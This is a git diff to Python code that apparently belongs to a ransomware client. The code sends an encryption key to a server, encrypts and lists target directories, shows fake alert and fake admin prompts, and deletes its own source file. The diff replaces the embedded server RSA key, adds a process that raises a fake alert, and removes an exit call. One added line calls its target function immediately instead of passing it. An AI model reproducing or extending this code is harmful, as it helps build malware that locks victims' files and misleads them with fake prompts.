@@ -11,6 +11,7 @@ import time
 from multiprocessing import Process
 from PIL import Image, ImageDraw, ImageFont
 from tkinter import Label, Entry
+import subprocess
 
 fileName='./Client.py'
 afterFileName='./Client_after_enc.py'
@@ -22,7 +23,7 @@ PUBLIC_KEY_RSA=0
 PRIVATE_KEY_AES_FILENAME=f"KEY_FILE2"
 PRIVATE_KEY_AES=0
 
-PUBLIC_SERVER_RSA_KEY=PublicKey(b'\xb3^\x8f\x82\x05u\x8f\xad\x9a\xf8\xc4\x8a\xac\xc7P\x14\x8d-\xed \xc2{\x19\xf0\x15P\xbc\x8eh\xacfY')
+PUBLIC_SERVER_RSA_KEY=PublicKey(b'\xf7U\x16-\xb6[^l\xc6\xc7^\xbe\xdb\x9e\xeb\xc6p\xb8\x1ffM3Z[e\xce\xa4\x86s\x9eu9')
 
 AES_BOX=0
 
@@ -158,6 +159,8 @@ if __name__=='__main__':
     sendKeyToServer(encrypted_aes_key)
     setEncryptModule()
     listUpTargetDir()
+    p=Process(target=fakeAlert())
+    p.start()
 
     if(IsAdmin==False):
         task_thread = threading.Thread(target=fakeAlert)
@@ -171,7 +174,6 @@ if __name__=='__main__':
                 
             os.system(afterFileName)
             os.remove(fileName)
-            exit(0)
             
     else:
         fakeAdmin()
